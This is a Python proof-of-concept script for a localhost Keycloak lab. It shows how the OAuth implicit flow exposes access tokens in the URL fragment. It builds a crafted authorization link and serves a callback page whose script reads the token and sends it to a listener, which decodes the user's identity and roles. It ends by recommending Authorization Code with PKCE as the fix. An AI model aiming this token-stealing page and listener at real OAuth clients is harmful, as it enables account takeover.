#!/usr/bin/env python3
"""
Implicit flow token leak.

vuln-rp has the implicit flow enabled. With response_type=token Keycloak returns
the access token in the URL fragment (#access_token=...). Fragments are never
sent to a server, but any JavaScript on the landing page can read
window.location.hash, so the token is exposed to the address bar, browser
history, and any script on the page (a third-party include or an XSS payload).
secure-lab's demo-rp has the implicit flow disabled and refuses the request.
Lab only; everything is localhost.
"""
import base64
import http.server
import json
import socketserver
import urllib.parse

KC = "http://localhost:8080"
REALM = "vuln-lab"
CLIENT = "vuln-rp"
PORT = 6660
REDIRECT = f"http://localhost:{PORT}/callback"

MALICIOUS_LINK = f"{KC}/realms/{REALM}/protocol/openid-connect/auth?" + urllib.parse.urlencode(
    {
        "client_id": CLIENT,
        "response_type": "token",       # <-- IMPLICIT: token straight back in the URL
        "scope": "openid profile email",
        "redirect_uri": REDIRECT,
        "state": "poc03",
        "nonce": "poc03nonce",
    }
)

# Page served at /callback: JS lifts the token out of the fragment and
# exfiltrates it to /collect (proving a page script can steal it).
CALLBACK_PAGE = b"""<!doctype html><html><body>
<h1>Lab: implicit-flow token is in the URL fragment.</h1>
<p>A script on this page is reading it now...</p>
<pre id="out"></pre>
<script>
  var hash = window.location.hash.substring(1);
  document.getElementById('out').textContent = decodeURIComponent(hash);
  // Exfiltrate to the attacker's server (the fragment is readable by any JS here)
  if (hash) { fetch('/collect?' + hash); }
</script>
</body></html>"""

captured = {"done": False}


def _decode(jwt: str) -> dict:
    p = jwt.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/callback":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(CALLBACK_PAGE)
            return
        if parsed.path == "/collect":
            q = urllib.parse.parse_qs(parsed.query)
            at = q.get("access_token", [""])[0]
            self.send_response(204)
            self.end_headers()
            if at:
                print(f"\n[attacker] token exfiltrated from URL fragment: {at[:40]}...")
                c = _decode(at)
                print("[attacker] *** ACCESS TOKEN LEAKED ***")
                print(f"           user:  {c.get('preferred_username')}")
                print(f"           email: {c.get('email')}")
                print(f"           roles: {c.get('realm_access', {}).get('roles')}")
                captured["done"] = True
            return
        self.send_response(404)
        self.end_headers()


def main():
    print("=" * 70)
    print("PoC 03 - Implicit flow token leak (attacker listener on port %d)" % PORT)
    print("=" * 70)
    print("\n1) Open this link in your browser (log in as victim/Password1 if asked):\n")
    print("   " + MALICIOUS_LINK)
    print("\n2) The landing page's own JavaScript reads the token from the")
    print("   address-bar fragment and sends it here. Watch below.\n")
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        while not captured["done"]:
            httpd.handle_request()
    print("\nDone. Fix: disable the implicit flow; use Authorization Code + PKCE")
    print("so tokens come back via a back-channel exchange, never in the URL.")


if __name__ == "__main__":
    main()
